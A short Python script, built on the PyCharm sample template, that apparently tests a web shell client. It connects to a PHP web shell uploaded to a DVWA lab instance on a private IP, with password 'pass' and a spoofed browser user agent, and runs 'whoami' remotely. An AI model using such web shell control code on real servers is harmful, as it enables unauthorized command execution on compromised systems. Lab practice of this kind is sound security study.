# This is a sample Python script.

# Press Shift+F10 to execute it or replace it with your code.
# Press Double Shift to search everywhere for classes, files, tool windows, actions, and settings.
from core.ShellEntity import ShellEntity
from core.Types import LanguageType
from core.ShellService import ShellService



def print_hi(name):
    # Use a breakpoint in the code line below to debug your script.
    print(f'Hi, {name}')  # Press Ctrl+F8 to toggle the breakpoint.


# Press the green button in the gutter to run the script.
if __name__ == '__main__':
   s = ShellEntity('192.168.217.130','/dvwa/hackable/uploads/shells.php','pass',LanguageType(2))
   ss = ShellService(s,'Mozilla/5.0 (iPad; CPU OS 13_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/84.0.4147.122 Mobile/15E148 Safari/604.1')
   print(ss.runCmd('whoami'))
# See PyCharm help at https://www.jetbrains.com/help/pycharm/
